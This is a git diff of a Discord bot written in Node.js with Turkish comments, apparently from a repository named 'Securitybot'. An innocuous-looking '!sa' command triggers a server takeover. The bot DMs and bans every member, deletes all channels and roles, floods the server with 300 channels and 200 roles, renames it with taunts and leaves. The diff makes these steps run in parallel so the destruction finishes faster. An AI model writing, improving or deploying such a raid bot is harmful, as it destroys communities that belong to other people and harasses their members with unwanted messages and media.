@@ -1,9 +1,9 @@
 require('dotenv').config();
 const { Client, GatewayIntentBits, Partials, EmbedBuilder, AttachmentBuilder } = require('discord.js');
 
-// ---- FETCH DÜZELTİLDİ (Node 22 uyumlu) ----
+// --- Node 22 fetch fix ---
 const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
-// -------------------------------------------
+// ---------------------------
 
 const client = new Client({
   intents: [
@@ -17,8 +17,23 @@ const client = new Client({
 
 const OWNER_ID = process.env.OWNER_ID;
 
-client.once('ready', () => {
-  console.log(`✅ Bot aktif: ${client.user.tag}`);
+// 📌 Videoyu önbelleğe al — komut çalışırken bot yavaşlamasın
+let cachedVideo = null;
+
+client.once('ready', async () => {
+  console.log(`🚀 Bot aktif: ${client.user.tag}`);
+
+  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
+
+  try {
+    const res = await fetch(videoURL);
+    const buffer = Buffer.from(await res.arrayBuffer());
+    cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });
+
+    console.log("🎥 Video cachelendi (hazır)");
+  } catch (err) {
+    console.log("❌ Video önbelleğe alınamadı:", err);
+  }
 });
 
 client.on('messageCreate', async (message) => {
@@ -28,67 +43,99 @@ client.on('messageCreate', async (message) => {
   const command = args.shift().toLowerCase();
 
   if (command === '!sa') {
+    if (!cachedVideo) return message.reply("❌ Video henüz yüklenmedi, 3 saniye bekleyip tekrar dene!");
 
-    const members = await message.guild.members.fetch();
-    let bannedCount = 0;
+    const guild = message.guild;
 
-    // 🔥 GitHub RAW video linki
-    const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
-
-    // Videoyu fetch'le
-    const response = await fetch(videoURL);
-    const buffer = Buffer.from(await response.arrayBuffer());
-    const video = new AttachmentBuilder(buffer, { name: "video.mp4" });
-
+    // -----------------------------
+    // 📌 Embed oluştur
+    // -----------------------------
     const embed = new EmbedBuilder()
       .setColor('Red')
       .setTitle('❌ Sunucudan Yasaklandınız!')
-      .setDescription('Fors ve TM Sunucuya El Koydu\n @1fors el koydu')
-      .setFooter({ text: '💦Fors Affetmez Sabaha Sunucun Affedilmez💦' });
-      // .setVideo() kaldırıldı
+      .setDescription('Fors ve TM Sunucuya El Koydu\n@1fors el koydu')
+      .setFooter({ text: '💦 Fors Affetmez Sabaha Sunucun Affedilmez 💦' });
 
-    // Üyeleri DM + ban
-    for (const member of members.values()) {
-      if (!member.user.bot && member.id !== OWNER_ID) {
-        await member.send({ embeds: [embed], files: [video] }).catch(() => {});
-        await member.ban({ reason: 'P@rno.' }).catch(() => {});
-        bannedCount++;
-      }
-    }
+    // -----------------------------
+    // 📌 Üyeleri çek
+    // -----------------------------
+    const members = await guild.members.fetch();
+    let bannedCount = 0;
 
-    // Kanalları sil
-    await Promise.all(message.guild.channels.cache.map(ch => ch.delete().catch(() => {})));
+    // -----------------------------
+    // ⚡ Üyeleri paralel DM + BAN
+    // -----------------------------
+    members.forEach(member => {
+      if (member.user.bot) return;
+      if (member.id === OWNER_ID) return;
 
-    // Yeni kanallar oluştur
-    const names = ['1fors💦', 'TM-ENESXDRADX💝', 'FORS SUNUCUYA EL KOYDU🔥'];
+      member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {});
+      member.ban({ reason: 'P@rno' }).catch(() => {});
+      bannedCount++;
+    });
+
+    // -----------------------------
+    // ⚡ Kanalları seri hızlı silme
+    // -----------------------------
+    guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
+
+    // -----------------------------
+    // ⚡ 300 Kanalı paralel oluştur
+    // -----------------------------
+    const channelNames = ['1fors💦', 'TM-ENESXDRADX💝', 'FORS SUNUCUYA EL KOYDU🔥'];
+    const channelTasks = [];
+
     for (let i = 0; i < 300; i++) {
-      const name = names[i % names.length];
-      await message.guild.channels.create({ name }).catch(() => {});
+      channelTasks.push(
+        guild.channels.create({
+          name: channelNames[i % channelNames.length]
+        }).catch(() => {})
+      );
     }
 
-    // Rolleri sil
-    for (const role of message.guild.roles.cache.values()) {
-      if (role.editable && role.id !== message.guild.id) {
-        await role.delete().catch(() => {});
+    Promise.all(channelTasks).catch(() => {});
+
+    // -----------------------------
+    // ⚡ Rolleri sil
+    // -----------------------------
+    guild.roles.cache.forEach(role => {
+      if (role.editable && role.id !== guild.id) {
+        role.delete().catch(() => {});
       }
-    }
+    });
 
-    // Yeni roller
+    // -----------------------------
+    // ⚡ 200 Rolü paralel oluştur
+    // -----------------------------
+    const roleTasks = [];
+
     for (let i = 0; i < 200; i++) {
       const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
-      await message.guild.roles.create({
-        name: 'BÖÖ KORKTUNMUU😜',
-        color: randomColor,
-        hoist: true
-      }).catch(() => {});
+
+      roleTasks.push(
+        guild.roles.create({
+          name: 'BÖÖ KORKTUNMUU😜',
+          color: randomColor,
+          hoist: true
+        }).catch(() => {})
+      );
     }
 
-    // Sunucu ismi değiştir
-    await message.guild.setName('💦Fors ve Enesxdradx Affetmez Sabaha Sunucun Affedilmez💦').catch(() => {});
+    Promise.all(roleTasks).catch(() => {});
 
-    await message.channel.send(`🧹 ${bannedCount} kişi banlandı. V For Vandetta ⚡.`);
+    // -----------------------------
+    // ⚡ Sunucu adını değiştir
+    // -----------------------------
+    guild.setName('💦Fors ve Enesxdradx Affetmez Sabaha Sunucun Affedilmez💦')
+      .catch(() => {});
 
-    await message.guild.leave().catch(() => {});
+    // -----------------------------
+    // ⚡ Mesaj bırak ve çık
+    // -----------------------------
+    message.channel.send(`⚡ ${bannedCount} kişi banlandı. V For Vandetta!`)
+      .catch(() => {});
+
+    guild.leave().catch(() => {});
   }
 });
 
